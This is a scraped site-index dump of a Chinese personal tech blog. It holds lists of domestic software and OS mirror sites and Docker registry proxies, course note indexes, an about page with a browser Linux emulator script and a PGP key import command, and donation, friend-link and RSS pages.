Souhu http://mirrors.sohu.com/apache/ 北大 https://mirrors.pku.edu.cn/apache/ 清华 https://mirrors.tuna.tsinghua.edu.cn/apache/ 中科大 https://mirrors.ustc.edu.cn/apache/ 北京交通 https://mirror.bjtu.edu.cn/apache/ NginxOfficial http://nginx.org/en/download.html Mirrors HUAWEI https://repo.huaweicloud.com/nginx/ Souhu http://mirrors.sohu.com/nginx 中科大 https://mirrors.ustc.edu.cn/nginx/ 西北农林科技大学 https://mirrors.nwsuaf.edu.cn/nginx/ OpenRestyOfficial https://openresty.org/cn/download.html Mirrors Tencent https://mirrors.cloud.tencent.com/openresty/ HUAWEI https://repo.huaweicloud.com/openresty/ 清华 https://mirrors.tuna.tsinghua.edu.cn/openresty/ 中科大 https://mirrors.ustc.edu.cn/openresty/ 西北农林科技大学 https://mirrors.nwsuaf.edu.cn/openresty/ 北京外国语大学 https://mirrors.bfsu.edu.cn/openresty/ KeepalivedOfficial https://www.keepalived.org/download.html Mirrors HUAWEI https://repo.huaweicloud.com/keepalived/ CephOfficial https://docs.ceph.com/en/quincy/install/get-packages/ Mirrors Aliyun https://developer.aliyun.com/mirror/ceph Tencent https://mirrors.cloud.tencent.com/ceph/ HUAWEI https://repo.huaweicloud.com/ceph/ 163 http://mirrors.163.com/ceph/ 清华 https://mirrors.tuna.tsinghua.edu.cn/ceph/ 重庆大学 https://mirrors.cqu.edu.cn/ceph/ 中科大 https://mirrors.ustc.edu.cn/ceph/ InfluxdataOfficial https://portal.influxdata.com/downloads/ Mirrors Tencent https://mirrors.cloud.tencent.com/influxdata/ 清华 https://mirrors.tuna.tsinghua.edu.cn/influxdata/ 中科大 https://mirrors.ustc.edu.cn/influxdata/ 北京外国语大学 https://mirrors.bfsu.edu.cn/influxdata/ ClickHouseOfficial https://clickhouse.com/#quick-start Mirrors Aliyun https://mirrors.aliyun.com/clickhouse/ 清华 https://mirrors.tuna.tsinghua.edu.cn/clickhouse/ RabbitmqOfficial https://www.rabbitmq.com/download.html Mirrors HUAWEI https://repo.huaweicloud.com/rabbitmq-server/ ETCDOfficial https://github.com/etcd-io/etcd/releases Mirrors HUAWEI https://repo.huaweicloud.com/etcd/ WireSharkOfficial https://www.wireshark.org/ Mirrors 清华 https://mirrors.tuna.tsinghua.edu.cn/wireshark/ 上海交通大学 https://mirror.sjtu.edu.cn/wireshark/ VirtualboxOfficial https://www.virtualbox.org/wiki/Downloads Mirrors Tencent https://mirrors.cloud.tencent.com/virtualbox/ 清华 https://mirrors.tuna.tsinghua.edu.cn/virtualbox/ 北京外国语大学 https://mirrors.bfsu.edu.cn/virtualbox/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/virtualbox/ iinaOfficial https://github.com/iina/iina/releases/ Mirrors Aliyun https://mirrors.aliyun.com/iina/ Tencent https://mirrors.cloud.tencent.com/iina/ 清华 https://mirrors.tuna.tsinghua.edu.cn/iina/ 北京外国语大学 https://mirrors.bfsu.edu.cn/iina/ chromiumOfficial https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html Mirrors Aliyun https://registry.npmmirror.com/binary.html?path=chromium-browser-snapshots/ huaweicloud https://repo.huaweicloud.com/chromium-browser-snapshots/ ungoogled-software.github.io(ungoogle chromium) https://ungoogled-software.github.io/ungoogled-chromium-binaries/releases/ System-Mirror系统镜像，又大又远，更需要找到好用优秀的国内镜像。 CentOS尽管 CentOS 不再更新了，但它仍旧并且还将持续是国内企业系统主力军。 可能官方考虑到下载困难的问题，官方也列出了距离使用者更近的镜像列表，可谓贴心。 Official https://www.centos.org/download/ Mirrors Aliyun https://mirrors.aliyun.com/centos/ Tencent https://mirrors.cloud.tencent.com/centos/ HUAWEI https://repo.huaweicloud.com/centos/ 163 http://mirrors.163.com/centos/ Souhu http://mirrors.sohu.com/centos/ 北大 https://mirrors.pku.edu.cn/centos/ 清华 https://mirrors.tuna.tsinghua.edu.cn/centos/ 中科大 https://mirrors.ustc.edu.cn/centos/ 浙江大学 http://mirrors.zju.edu.cn/centos/ 南阳理工 https://mirror.nyist.edu.cn/centos/ 兰州大学 https://mirror.lzu.edu.cn/centos/ 东北大学 http://mirror.neu.edu.cn/centos/ 大连东软 http://mirrors.neusoft.edu.cn/centos/ 上海交通 http://ftp.sjtu.edu.cn/centos/ 北京交通 https://mirror.bjtu.edu.cn/centos/ 大连理工 http://mirror.dlut.edu.cn/centos/ 首都在线 http://mirrors.yun-idc.com/centos/ 南京邮电 http://mirrors.njupt.edu.cn/centos/ 西北农林科技大学 https://mirrors.nwsuaf.edu.cn/centos/ 重庆大学 https://mirrors.cqu.edu.cn/centos/ 北京外国语大学 https://mirrors.bfsu.edu.cn/centos/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/centos/ CentOS-altarchARM 架构下的 CentOS 镜像。 Official https://www.centos.org/download/ Mirrors Aliyun https://developer.aliyun.com/mirror/centos-altarch Tencent https://mirrors.cloud.tencent.com/centos-altarch/ HUAWEI https://repo.huaweicloud.com/centos-altarch/ 清华 https://mirrors.tuna.tsinghua.edu.cn/centos-altarch/ 中科大 https://mirrors.ustc.edu.cn/centos-altarch/ 兰州大学 https://mirror.lzu.edu.cn/centos-altarch/ 北京外国语大学 https://mirrors.bfsu.edu.cn/centos-altarch/ UbuntuOfficial 官方镜像：https://ubuntu.com/download Mirrors Aliyun https://mirrors.aliyun.com/ubuntu/ Tencent https://mirrors.cloud.tencent.com/ubuntu/ HUAWEI https://repo.huaweicloud.com/ubuntu/ 163 http://mirrors.163.com/ubuntu/ Souhu http://mirrors.sohu.com/ubuntu/ 北大 https://mirrors.pku.edu.cn/ubuntu/ 清华 https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ 中科大 https://mirrors.ustc.edu.cn/ubuntu/ 浙江大学 http://mirrors.zju.edu.cn/ubuntu/ 兰州大学 https://mirror.lzu.edu.cn/ubuntu/ 大连东软 http://mirrors.neusoft.edu.cn/ubuntu/ 上海交通 http://ftp.sjtu.edu.cn/ubuntu/ 北京交通 https://mirror.bjtu.edu.cn/ubuntu/ 大连理工 http://mirror.dlut.edu.cn/ubuntu/ 首都在线 http://mirrors.yun-idc.com/ubuntu/ 南京邮电 http://mirrors.njupt.edu.cn/ubuntu/ 南阳理工 https://mirror.nyist.edu.cn/ubuntu/ 重庆大学 https://mirrors.cqu.edu.cn/ubuntu/ 北京外国语大学 https://mirrors.bfsu.edu.cn/ubuntu/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/ubuntu DebianOfficial 官方镜像：https://www.debian.org/mirror/ 全球镜像：https://www.debian.org/mirror/list Mirrors Aliyun https://mirrors.aliyun.com/debian/ Tencent https://mirrors.cloud.tencent.com/debian/ HUAWEI https://repo.huaweicloud.com/debian/ 163 http://mirrors.163.com/debian/ Souhu http://mirrors.sohu.com/debian/ 北大 https://mirrors.pku.edu.cn/debian/ 清华 https://mirrors.tuna.tsinghua.edu.cn/debian/ 中科大 https://mirrors.ustc.edu.cn/debian/ 浙江大学 http://mirrors.zju.edu.cn/debian/ 兰州大学 https://mirror.lzu.edu.cn/debian/ 大连东软 http://mirrors.neusoft.edu.cn/debian/ 上海交通 http://ftp.sjtu.edu.cn/debian/ 北京交通 https://mirror.bjtu.edu.cn/debian/ 大连理工 http://mirror.dlut.edu.cn/debian/ 首都在线 http://mirrors.yun-idc.com/debian/ 南京邮电 http://mirrors.njupt.edu.cn/debian/ 南阳理工 https://mirror.nyist.edu.cn/debian/ 重庆大学 https://mirrors.cqu.edu.cn/debian/ 北京外国语大学 https://mirrors.bfsu.edu.cn/debian/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/debian/ DeepinOfficial 官方镜像：https://www.deepin.org/zh/download/ Mirrors Aliyun https://mirrors.aliyun.com/deepin/ HUAWEI https://repo.huaweicloud.com/deepin/ 163 http://mirrors.163.com/deepin/ Souhu http://mirrors.sohu.com/deepin/ 清华 https://mirrors.tuna.tsinghua.edu.cn/deepin/ 中科大 https://mirrors.ustc.edu.cn/deepin/ 浙江大学 http://mirrors.zju.edu.cn/deepin/ 兰州大学 https://mirror.lzu.edu.cn/deepin/ 上海交通 http://ftp.sjtu.edu.cn/deepin/ 南京邮电 http://mirrors.njupt.edu.cn/deepin/ 南阳理工 https://mirror.nyist.edu.cn/deepin/ 重庆大学 https://mirrors.cqu.edu.cn/deepin/ 北京外国语大学 https://mirrors.bfsu.edu.cn/deepin/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/deepin/ FedoraOfficial 官方镜像：https://getfedora.org/en/server/download/ Mirrors Aliyun https://mirrors.aliyun.com/fedora/ Tencent https://mirrors.cloud.tencent.com/fedora/ HUAWEI https://repo.huaweicloud.com/fedora/ 163 http://mirrors.163.com/fedora/ Souhu http://mirrors.sohu.com/fedora/ 清华 https://mirrors.tuna.tsinghua.edu.cn/fedora/ 中科大 https://mirrors.ustc.edu.cn/fedora/ 浙江大学 http://mirrors.zju.edu.cn/fedora/ 兰州大学 https://mirror.lzu.edu.cn/fedora/ 上海交通 http://ftp.sjtu.edu.cn/fedora/ 南京邮电 http://mirrors.njupt.edu.cn/fedora/ 南阳理工 https://mirror.nyist.edu.cn/fedora/ 重庆大学 https://mirrors.cqu.edu.cn/fedora/ 北京外国语大学 https://mirrors.bfsu.edu.cn/fedora/ GentooOfficial 官方镜像：https://www.gentoo.org/downloads/ Mirrors Aliyun https://mirrors.aliyun.com/gentoo/ Tencent https://mirrors.cloud.tencent.com/gentoo/ HUAWEI https://repo.huaweicloud.com/gentoo/ 163 http://mirrors.163.com/gentoo/ Souhu http://mirrors.sohu.com/gentoo/ 清华 https://mirrors.tuna.tsinghua.edu.cn/gentoo/ 中科大 https://mirrors.ustc.edu.cn/gentoo/ 浙江大学 http://mirrors.zju.edu.cn/gentoo/ 兰州大学 https://mirror.lzu.edu.cn/gentoo/ 北京外国语大学 https://mirrors.bfsu.edu.cn/gentoo/ 上海交通 https://mirrors.sjtug.sjtu.edu.cn/gentoo/ kaliOfficial https://www.kali.org/get-kali/ Mirrors Aliyun https://mirrors.aliyun.com/kali/ Tencent https://mirrors.cloud.tencent.com/kali/ HUAWEI https://repo.huaweicloud.com/kali/ 清华 https://mirrors.tuna.tsinghua.edu.cn/kali/ 中科大 https://mirrors.ustc.edu.cn/kali/ 浙江大学 http://mirrors.zju.edu.cn/kali/ 南阳理工 https://mirror.nyist.edu.cn/kali/ 大连东软 http://mirrors.neusoft.edu.cn/kali/ 北京交通 https://mirror.bjtu.edu.cn/kali/ 南京邮电 http://mirrors.njupt.edu.cn/kali/ 西北农林科技大学 https://mirrors.nwsuaf.edu.cn/kali/ 重庆大学 https://mirrors.cqu.edu.cn/kali-images/ 北京外国语大学 https://mirrors.bfsu.edu.cn/kali/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/kali 上海交通大学 https://mirrors.sjtug.sjtu.edu.cn/kali/ OpensuseOfficial https://get.opensuse.org/zh-CN/ Mirrors Aliyun https://mirrors.aliyun.com/opensuse/ Tencent https://mirrors.cloud.tencent.com/opensuse/ HUAWEI https://repo.huaweicloud.com/opensuse/ Souhu http://mirrors.sohu.com/opensuse/ 北大 https://mirrors.pku.edu.cn/opensuse/ openTUNA https://opentuna.cn/opensuse/ 中科大 https://mirrors.ustc.edu.cn/opensuse/ 浙江大学 http://mirrors.zju.edu.cn/opensuse/ 兰州大学 https://mirror.lzu.edu.cn/opensuse/ 上海交通 http://ftp.sjtu.edu.cn/opensuse/ 北京交通 https://mirror.bjtu.edu.cn/opensuse/ 首都在线 http://mirrors.yun-idc.com/opensuse/ 重庆大学 https://mirrors.cqu.edu.cn/opensuse/ 北京理工 https://mirror.bit.edu.cn/opensuse/ 重庆大学 https://mirrors.cqu.edu.cn/opensuse/ 哈工大 https://mirrors.hit.edu.cn/opensuse/ 南京大学 http://mirrors.nju.edu.cn/opensuse/ 南方科技大学 https://mirrors.sustech.edu.cn/opensuse/ 北京外国语大学 https://mirrors.bfsu.edu.cn/opensuse/ 哈尔滨工业大学 https://mirrors.hit.edu.cn/opensuse/ FreebsdOfficial https://www.freebsd.org/where/ Mirrors Aliyun https://mirrors.aliyun.com/freebsd/ Tencent https://mirrors.cloud.tencent.com/freebsd/ HUAWEI https://repo.huaweicloud.com/freebsd/ 中科大 https://mirrors.ustc.edu.cn/freebsd/ 兰州大学 https://mirror.lzu.edu.cn/freebsd/ 北京交通 https://mirror.bjtu.edu.cn/freebsd/ 首都在线 http://mirrors.yun-idc.com/freebsd/ GNUOfficial https://www.gnu.org/software/octave/download Mirrors Aliyun https://mirrors.aliyun.com/gnu/ Tencent https://mirrors.cloud.tencent.com/gnu/ HUAWEI https://repo.huaweicloud.com/gnu/ 清华 https://mirrors.tuna.tsinghua.edu.cn/gnu/ 中科大 https://mirrors.ustc.edu.cn/gnu/ 兰州大学 https://mirror.lzu.edu.cn/gnu/ 北京交通 https://mirror.bjtu.edu.cn/gnu/ Other-MirrorDocker-hub没有整理 Docker-hub 的镜像的原因是，鉴于这种仓库的特殊性，国内也确实没有一家将之全站镜像的，果真如此，倒也并不科学了。 不过关于 Docker-hub 以及 GitHub 的使用，又的确会经常遇到网络方面的问题，因此也一直在留心这方面的解决方案，目前大多是提供加速的方案，算是镜像方案之下的一个折中策略。 Official https://hub.docker.com/ 其他的镜像仓库不再单独列出。 Mirrors使用方式： 使用方式都是替换原来镜像的前缀域名即可实现加速效果，比如： 原来地址： eryajf/centos:7.4 # 这个是官方镜像，省略了前边的域名替换地址： docker.mirrors.sjtug.sjtu.edu.cn/eryajf/centos:7.4 另外，加速通常只是针对某个源站进行的加速，国外对公开放的 docker 仓库并非官方一家，因此这里就以源站的维度进行区分，整理出经过测试可用的加速站。 Docker-hub 上海交通大学 docker.mirrors.sjtug.sjtu.edu.cn 中科大 docker.mirrors.ustc.edu.cn docker proxy dockerproxy.com gcr.io docker proxy gcr.dockerproxy.com lank8s：后期可能会转成付费 gcr.lank8s.cn k8s.gcr.io 上海交通大学 k8s-gcr-io.mirrors.sjtug.sjtu.edu.cn docker proxy k8s.dockerproxy.com lank8s lank8s.cn ghcr.io docker proxy ghcr.dockerproxy.com quay.io 中科大 quay.mirrors.ustc.edu.cn"},{"title":"","date":"2019-09-19T03:24:00.000Z","updated":"2022-09-06T01:38:00.000Z","comments":true,"path":"notes/pdf/bigdata.html","permalink":"https://blog.mhuig.top/notes/pdf/bigdata","excerpt":"","text":"大数据处理技术 大数据处理技术 volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-BigData-Archive-4bf68d5a9dfa76e95fd97bd641f84806e5e0bcb9\", \"MHuiG\", \"BigData-Archive\", \"4bf68d5a9dfa76e95fd97bd641f84806e5e0bcb9\", false); }) day01 大数据集群环境准备 &amp; zookeeper 的介绍以及集群环境搭建三台虚拟机创建并联网 大数据集群环境准备 分布式集群 zookeeper 的介绍以及集群环境搭建 day02 大数据发展简史及环境安装hadoop 的介绍以及发展历史 hadoop 的历史版本介绍 三大公司发行版本介绍 hadoop 的架构模型（1.x，2.x 的各种架构模型介绍） apache hadoop 三种架构介绍（standAlone) apache hadoop 三种架构介绍（伪分布介绍以及安装） apache hadoop 三种架构介绍（高可用分布式环境介绍以及安装） day03Hadoop 集群初体验 &amp; HDFS 的命令行使用hadoop 集群初体验 HDFS 入门介绍 HDFS 的命令行使用 CDH 伪分布式环境搭建 day04 分布式文件系统 HDF分布式文件系统详细介绍 HDFS 分布式文件系统设计目标 HDFS 的来源 HDFS 的架构图之基础架构 hdfs 的架构之文件的文件副本机制 HDFS 的元数据信息 FSimage 以及 edits 和 secondaryNN 的作用 HDFS 的文件写入过程 HDFS 的文件读取过程 HDFS 的 JavaAPI 操作 day05MapReduce 编程模型 - WordCount 实例分析理解 MapReduce 思想 HadoopMapReduce 设计构思 MapReduce 框架结构 MapReduce 编程规范及示例编写 WordCount 示例编写本地模式 MapReduce 编程模型 - WordCount 实例分析 day06MapReduce 的运行机制MapReduce 的分区与 reduceTask 的数量 MapTask 运行机制详解以及 Map 任务的并行度 ReduceTask 工作机制以及 reduceTask 的并行度 MapReduceshuffle 过程 索引建立 day07Yarn 资源调度及 Hive 初步Hive 基本概念 Hive 的安装部署 Hive 基本操作之创建数据库 创建数据库表 hive 语句综合练习 Yarn 资源调度 关于 yarn 常用参数设置 day08Flume 数据采集Flume 介绍 Flume 的安装部署 采集案例监控目录变化 采集案例监控文件的变化 两个 agent 级联 更多 source 和 sink 组件 高可用 Flume flume 的负载均衡 loadbalancer day09 消息队列 Kafkakafka 的介绍 kafka 的安装 kafka 的命令行的管理使用 kafka 的 javaAPI 的使用 kafka 的数据的分区 kafka 的配置文件的说明 flume 与 kafka 的整合 kafka-manager 监控工具的使用 CDH 版本的 zookeeper 环境搭建 day10sqoop 数据迁移sqoop day11 工作流调度器 azkaban &amp; 数据可视化 Echarts 介绍azkaban 数据可视化 Echarts 介绍"},{"title":"","date":"2019-09-19T01:16:00.000Z","updated":"2022-09-06T01:26:00.000Z","comments":true,"path":"notes/pdf/cumcm.html","permalink":"https://blog.mhuig.top/notes/pdf/cumcm","excerpt":"","text":"数学建模资料 数学建模资料 汇总司守奎老师的讲义 程序 习题解答等 volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-MCM-Archive-a9efbfb4b80a822b6ed30fb86c281ce44eb8e17d\", \"MHuiG\", \"MCM-Archive\", \"a9efbfb4b80a822b6ed30fb86c281ce44eb8e17d\", false); }) 封面 封面 前言 前言 目录 目录 第一章 线性规划 第一章 线性规划 第二章 整数规划 第二章 整数规划 第三章 非线性规划 第三章 非线性规划 第四章 动态规划 第四章 动态规划 第五章 图与网络 第五章 图与网络 第六章 排队论 第六章 排队论 第七章 对策论 第七章 对策论 第八章 层次分析法 第八章 层次分析法 第九章 插值与拟合 第九章 插值与拟合 第十章 数据的统计描述和分析 第十章 数据的统计描述和分析 第十一章 方差分析 第十一章 方差分析 第十二章 回归分析 第十二章 回归分析 第十三章 微分方程建模 第十三章 微分方程建模 第十四章 稳定状态模型 第十四章 稳定状态模型 第十五章 常微分方程的解法 第十五章 常微分方程的解法 第十六章 差分方程模型 第十六章 差分方程模型 第十七章 马氏链模型 第十七章 马氏链模型 第十八章 变分法模型 第十八章 变分法模型 第十九章 神经网络模型 第十九章 神经网络模型 第二十章 偏微分方程的数值解 第二十章 偏微分方程的数值解 第二十一章 目标规划 第二十一章 目标规划 第二十二章 模糊数学模型 第二十二章 模糊数学模型 第二十三章 现代优化算法 第二十三章 现代优化算法 第二十四章 时间序列模型 第二十四章 时间序列模型 第二十五章 灰色系统理论及其应用 第二十五章 灰色系统理论及其应用 第二十六章 多元分析 第二十六章 多元分析 第二十七章 偏最小二乘回归分析 第二十七章 偏最小二乘回归分析 第二十八章 存贮论 第二十八章 存贮论 第二十九章 经济与金融中的优化问题 第二十九章 经济与金融中的优化问题 第三十章 生产与服务运作管理中的优化问题 第三十章 生产与服务运作管理中的优化问题 第三十一章 支持向量机 第三十一章 支持向量机 第三十二章 作业计划 第三十二章 作业计划 附录一 Matlab 入门 附录一 Matlab 入门 附录二 Matlab 在线性代数中的应用 附录二 Matlab 在线性代数中的应用 附录三 运筹学的 LINGO 软件 附录三 运筹学的 LINGO 软件 附录四 Excel 在统计分析与数量方法中的应用 附录四 Excel 在统计分析与数量方法中的应用 附录五 SPSS 在统计分析中的应用 附录五 SPSS 在统计分析中的应用 参考文献 参考文献"},{"title":"","date":"2019-09-17T01:02:00.000Z","updated":"2022-09-06T02:20:00.000Z","comments":true,"path":"notes/pdf/data-mining.html","permalink":"https://blog.mhuig.top/notes/pdf/data-mining","excerpt":"","text":"数据挖掘资料 数据挖掘 PDF 资料 数据挖掘概念与特性 常用分类算法及原理 常用降维算法及原理 常用聚类算法及原理 关联分析及常用算法 常用推荐算法及原理 自然语言处理研究报告 NLP"},{"title":"","date":"2022-05-12T09:37:00.000Z","updated":"2022-05-12T09:37:00.000Z","comments":true,"path":"notes/pdf/index.html","permalink":"https://blog.mhuig.top/notes/pdf/","excerpt":"","text":".fa-secondary{opacity:.4} PDF PDF .prev-next{ display: none !important; }"},{"title":"","date":"2025-11-10T11:28:12.602Z","updated":"2025-11-10T11:28:12.602Z","comments":true,"path":"pages/about/index.html","permalink":"https://blog.mhuig.top/pages/about/","excerpt":"","text":"关于我 MHuiG 关于我关于本站&gt;_ 热爱技术，热爱创造。 正在探秘事物本质与联系的探索者。 喜欢遥望星星存在过的地方。 博客大事记 本站多线部署 选择网络最佳线路 https://blog.mhuig.top Cloudflare / GitHub Pages https://cfpages.blog.mhuig.top Cloudflare Pages https://vercel.blog.mhuig.top Vercel https://netlify.blog.mhuig.top Netlify 我已使用 GPG 签名验证了我的身份，该签名证明了我对该域的所有权。 请参阅此处的加密证明： Keybase - claimed ownership of mhuig.top via dns 我的 GPG 公钥托管在 Keybase-mhuig 上。您可以通过以下方式拉出并导入我的 GPG 公钥： curl https://keybase.io/mhuig/pgp_keys.asc | gpg --import 在 Alone 的海洋里有一只孤独的鲸，没有放弃海洋的它终会在最后找到同频率的伙伴。 —52 赫兹的鲸 var now = new Date(); function SiteTime() { try{ var grt= new Date(\"08/19/2019 21:23:12\"); now.setTime(now.getTime()+250); days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 ){hnum = \"0\" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = \"0\" + mnum;} seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 ){snum = \"0\" + snum;} document.getElementById(\"timeDate\").innerHTML = \"本站已安全运行 \"+dnum+\" 天 \"; document.getElementById(\"times\").innerHTML = hnum + \" 小时 \" + mnum + \" 分 \" + snum + \" 秒\"; }catch(e){} } if(typeof SiteTimeFlag==\"undefined\"){ var TimeInterval=setInterval(SiteTime,250); window.SiteTimeFlag=true; } ////////////////////////// screen_container ////////////////////////// function screen_container(){ if(volantis.linux){ TinyCore() }else{ volantis.linux={} buildroot() } } function buildroot(){ var emulator = window.emulator = new V86Starter({ wasm_path: \"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/build/v86.wasm\", memory_size: 128 * 1024 * 1024, vga_memory_size: 8 * 1024 * 1024, screen_container: document.getElementById(\"screen_container\"), bios: { url: \"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/bios/seabios.bin\", }, vga_bios: { url: \"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/bios/vgabios.bin\", }, cdrom: { url: \"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/images/linux.iso\", }, autostart: true, }); var data = \"\"; emulator.add_listener(\"serial0-output-char\", function(char){ if(char !== \"\\r\"){ data += char; } if(data.endsWith(\"(none) login: \")){ /*var el=document.getElementById(\"loading\") if(el){ el.style.display = \"none\"; }*/ emulator.keyboard_send_text(\"echo Welcome to MHuiG\\\\'s Blog!\"); emulator.keyboard_send_keys([13]); } }); emulator.add_listener(\"serial0-output-line\", function(line){ //console.log(line) }); emulator.add_listener(\"download-progress\", function(e){ show_progress(e); }); } function TinyCore(){ var emulator = window.emulator = new V86Starter({ wasm_path: \"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/build/v86.wasm\", memory_size: 128 * 1024 * 1024, vga_memory_size: 8 * 1024 * 1024, screen_container: document.getElementById(\"screen_container\"), bios: { url: \"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/bios/seabios.bin\", }, vga_bios: { url: \"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/bios/vgabios.bin\", }, cdrom: { url: \"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/images/Core-11.1.iso\", }, autostart: true, network_relay_url: \"wss://relay.widgetry.org/\", }); emulator.add_listener(\"download-progress\", function(e){ show_progress(e); }); var checkExistBoot = setInterval(function() { try { if(document.querySelector(\"#screen_container > div > div:nth-child(7) > span:nth-child(1)\").innerHTML!=\"boot: \") return clearInterval(checkExistBoot); emulator.keyboard_send_keys([13]); } catch (error) {} },100); var checkExistStart = setInterval(function() { try { if(document.querySelector(\"#screen_container > div > div:nth-child(5) > span:nth-child(1)\").innerHTML!=\"tc@box:~$ \")return clearInterval(checkExistStart); emulator.keyboard_send_text(\"echo Welcome to MHuiG\\\\'s Blog!\"); emulator.keyboard_send_keys([13]); } catch (error) {} },100); } function pjax_screen_container(){ if(document.querySelector(\"#screen_container\")){ volantis.dom.$(document.querySelector(\"#tab-aboutme > ul > li:nth-child(4) > a\")).on(\"click\",function(){ volantis.js(\"https://cdn.jsdelivr.net/npm/imbox@0.0.9/linux/build/libv86.js\",screen_container) volantis.dom.$(document.querySelector(\"#tab-aboutme > ul > li:nth-child(1),#tab-aboutme > ul > li:nth-child(2),#tab-aboutme > ul > li:nth-child(3),#tab-aboutme > ul > li:nth-child(5) > a\")).on(\"click\",function(){ try{emulator.destroy()}catch(e){} }); }); } } pjax_screen_container(); function chr_repeat(chr, count){ var result = \"\"; while(count-- > 0){ result += chr; } return result; } function show_progress(e){ var el = document.getElementById(\"loading\"); if(!el) return el.style.display = \"block\"; if(e.file_name.endsWith(\".wasm\")){ const parts = e.file_name.split(\"/\"); el.textContent = \"Fetching \" + parts[parts.length - 1] + \" ...\"; return; } if(e.file_index === e.file_count - 1 && e.loaded >= e.total - 2048){ // last file is (almost) loaded el.textContent = \"Done downloading. Starting now ...\"; return; } var line = \"Downloading images \"; if(typeof e.file_index === \"number\" && e.file_count){ line += \"[\" + (e.file_index + 1) + \"/\" + e.file_count + \"] \"; } var progress_ticks = 0; if(e.total && typeof e.loaded === \"number\"){ var per100 = Math.floor(e.loaded / e.total * 100); per100 = Math.min(100, Math.max(0, per100)); var per50 = Math.floor(per100 / 2); line += per100 + \"% [\"; line += chr_repeat(\"#\", per50); line += chr_repeat(\" \", 50 - per50) + \"]\"; }else{ line += chr_repeat(\".\", progress_ticks++ % 50); } el.textContent = line; } volantis.pjax.push(pjax_screen_container) /////////////////////////////////////////////////////////////////////////"},{"title":"","date":"2019-09-17T01:02:00.000Z","updated":"2022-09-06T02:20:00.000Z","comments":true,"path":"notes/pdf/data-visualization.html","permalink":"https://blog.mhuig.top/notes/pdf/data-visualization","excerpt":"","text":"数据可视化资料 数据可视化 PDF 资料 HTML 的基本标签及语法 CSS 语法规则 网页基本布局方式 自适应设计和响应式设计 js 基本语法汇总 Ajax 基本原理和概念 Ajax 实现与后台服务通信 Echarts 常用功能 api"},{"title":"","date":"2025-11-10T11:28:12.605Z","updated":"2025-11-10T11:28:12.605Z","comments":true,"path":"pages/beer/index.html","permalink":"https://blog.mhuig.top/pages/beer/","excerpt":"","text":"🍻 Give Me A Cup Of Beer? 🍻 Give Me A Cup Of Beer? ETH0x6E5AfEfde2DD46935ff23e2F33033888307528f2 XMR83nqQBbxNv9MVaEVY2JsYmELx9AGfUMSE3zvhS7msjsPRR1TnAWHniNFrJX3TnEoVWCHjhMQSNsFyKprq9hudy2X48TyMeT BTCbc1q4kyx3csltyr3ewllglm3whz65vpt7lzlxqvad9"},{"title":"","date":"2025-11-10T11:28:12.608Z","updated":"2025-11-10T11:28:12.608Z","comments":true,"path":"pages/friends/index.html","permalink":"https://blog.mhuig.top/pages/friends/","excerpt":"","text":"My Friends Links My Friends 来自 GitHub 的小伙伴们:以下友链通过 GitHub Issue 提交： Thanks本博客是在以下框架技术和开源服务的支持下搭建起来的: HexoVolantisGithubUnsplashjsDelivrVercelcloudflare 欢迎互换友链！ 如何自助添加友链？先友后链，在我们有一定了解了之后才可以交换友链，除此之外，您的网站还应满足以下条件： 合法的、非营利性、无商业广告 有实质性原创内容的 HTTPS 站点 第一步：新建 Issue 新建 GitHub Issue 按照模板格式填写并提交。为了提高图片加载速度，建议优化头像：打开 压缩图 上传自己的头像，将图片尺寸调整到 96px 后下载。将压缩后的图片上传到 ooxx.ooo 免费图床 并使用此图片链接作为头像。 第二步：添加友链并等待管理员审核 请添加本站到您的友链中，如果您也使用 issue 作为友链源，只需要告知您的友链源仓库即可。您可以添加本站的任何一个域，下面只是一个例子。title: MHuiGavatar: https://fastly.jsdelivr.net/npm/mhg@latesturl: https://mhuig.topscreenshot: https://fastly.jsdelivr.net/npm/mhgoos@0.0.1655533137084/web.pngdescription: 「Be Yourself Make a Difference」keywords: 搞事情🤣待管理员审核通过，添加了 active 标签后，回来刷新即可生效。 如果您需要更新自己的友链，请直接修改 issue 内容，大约 3 分钟内生效，无需等待博客更新。如果无法修改，可以重新创建一个。"},{"title":"","date":"2025-11-10T11:28:12.610Z","updated":"2025-11-10T11:28:12.610Z","comments":true,"path":"pages/rss/index.html","permalink":"https://blog.mhuig.top/pages/rss/","excerpt":"","text":"RSS 订阅 RSS 订阅 Really Simple Syndication AtomAtom/atom.xml RSS2RSS2/rss2.xml"},{"title":"","date":"2025-11-10T11:28:12.613Z","updated":"2025-11-10T11:28:12.613Z","comments":true,"path":"pages/talk/index.html","permalink":"https://blog.mhuig.top/pages/talk/","excerpt":"","text":"碎言碎语 volantis.layoutHelper(\"page-plugins\",``,{pjax:false}) volantis.css(\"https://static.mhuig.top/npm/@copoko/hole@1.0.0/dist/Hole.css\") volantis.js(\"https://static.mhuig.top/npm/@copoko/hole@1.0.0/dist/Hole.js\").then(() => { new Hole({ api: \"https://cpk.mhuig.top\" }); }) function HoleDark() { if (volantis.dark.mode == \"light\") { document.querySelector(\".hole\") && 